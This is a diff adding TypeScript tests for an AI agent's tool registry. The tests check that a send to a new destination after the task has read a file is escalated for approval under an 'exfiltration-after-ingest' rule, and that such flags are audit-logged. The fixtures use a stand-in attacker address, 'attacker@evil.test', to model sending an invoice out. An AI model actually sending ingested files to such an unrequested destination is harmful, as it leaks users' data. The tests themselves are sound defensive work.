@@ -341,3 +341,160 @@ describe('tainted tasks', () => {
     expect(registry.isTainted('t1')).toBe(false)
   })
 })
+
+describe('sequence-level scrutiny', () => {
+  /** A tool that reads something back, standing in for a file or an inbox. */
+  const readTool: ToolDefinition<{ path: string }> = {
+    name: 'read_file',
+    description: 'reads a file',
+    schema: { type: 'object', properties: { path: { type: 'string' } } },
+    permissionLevel: 'safe',
+    async execute() {
+      return { ok: true, content: 'the contents of the invoice' }
+    },
+  }
+
+  /** A `safe` tool that addresses somewhere, standing in for an MCP send. */
+  const sendTool: ToolDefinition<{ to: string }> = {
+    name: 'send',
+    description: 'sends the message somewhere',
+    schema: { type: 'object', properties: { to: { type: 'string' } } },
+    permissionLevel: 'safe',
+    async execute(args) {
+      return { ok: true, content: `sent to ${args.to}` }
+    },
+  }
+
+  const read = { id: 'r', name: 'read_file', args: { path: 'invoice.pdf' } }
+  const send = { id: 's', name: 'send', args: { to: 'attacker@evil.test' } }
+
+  function registryWith(handler: ApprovalHandler): ToolRegistry {
+    const registry = new ToolRegistry()
+    registry.register(readTool)
+    registry.register(sendTool)
+    registry.onApproval(handler)
+    return registry
+  }
+
+  it('asks about a safe call that sends somewhere new after the task read something', async () => {
+    const asked: string[] = []
+    const registry = registryWith((_call, _tool, context) => {
+      asked.push(context.escalation?.rule ?? 'none')
+      return false
+    })
+
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    const result = await registry.execute(send, { taskId: 't1', signal: ctx() })
+
+    expect(asked).toEqual(['exfiltration-after-ingest'])
+    expect(result.ok).toBe(false)
+    expect(result.error).toContain('evil.test')
+  })
+
+  it('lets the same call through untouched when the task has read nothing yet', async () => {
+    let asked = 0
+    const registry = registryWith(() => {
+      asked++
+      return false
+    })
+
+    const result = await registry.execute(send, { taskId: 't1', signal: ctx() })
+
+    expect(asked).toBe(0)
+    expect(result).toEqual({ ok: true, content: 'sent to attacker@evil.test' })
+  })
+
+  it('does not ask about a destination the user named themselves', async () => {
+    let asked = 0
+    const registry = registryWith(() => {
+      asked++
+      return false
+    })
+    registry.noteUserRequest('t1', 'read invoice.pdf and mail it to attacker@evil.test')
+
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    const result = await registry.execute(send, { taskId: 't1', signal: ctx() })
+
+    expect(asked).toBe(0)
+    expect(result.ok).toBe(true)
+  })
+
+  it('asks again for the same destination rather than spending a remembered approval', async () => {
+    let asked = 0
+    const registry = registryWith((): ApprovalDecision => {
+      asked++
+      return { approved: true, scope: 'session', match: 'tool' }
+    })
+
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    await registry.execute(send, { taskId: 't1', signal: ctx() })
+    await registry.execute({ ...send, args: { to: 'attacker@other-evil.test' } }, { taskId: 't1', signal: ctx() })
+
+    expect(asked).toBe(2)
+    expect(registry.listApprovals()).toEqual([])
+  })
+
+  it('stops asking about a destination the task has already reached', async () => {
+    let asked = 0
+    const registry = registryWith(() => {
+      asked++
+      return true
+    })
+
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    await registry.execute(send, { taskId: 't1', signal: ctx() })
+    await registry.execute(send, { taskId: 't1', signal: ctx() })
+
+    expect(asked).toBe(1)
+  })
+
+  it('does not let a refused destination become a settled one', async () => {
+    let asked = 0
+    const registry = registryWith(() => {
+      asked++
+      return false
+    })
+
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    await registry.execute(send, { taskId: 't1', signal: ctx() })
+    await registry.execute(send, { taskId: 't1', signal: ctx() })
+
+    expect(asked).toBe(2)
+  })
+
+  it('records the rule that flagged a call in the audit log', async () => {
+    const registry = registryWith(() => false)
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    await registry.execute(send, { taskId: 't1', signal: ctx() })
+
+    expect(registry.auditLog.at(-1)?.escalation?.rule).toBe('exfiltration-after-ingest')
+    expect(registry.auditLog.at(-1)?.permissionLevel).toBe('safe')
+  })
+
+  it('forgets what a task read once its turn ends', async () => {
+    let asked = 0
+    const registry = registryWith(() => {
+      asked++
+      return false
+    })
+
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    registry.endTask('t1')
+    await registry.execute(send, { taskId: 't1', signal: ctx() })
+
+    expect(asked).toBe(0)
+  })
+
+  it('keeps what one task read out of another task’s judgement', async () => {
+    let asked = 0
+    const registry = registryWith(() => {
+      asked++
+      return false
+    })
+
+    await registry.execute(read, { taskId: 't1', signal: ctx() })
+    await registry.execute(send, { taskId: 't2', signal: ctx() })
+
+    expect(asked).toBe(0)
+  })
+})
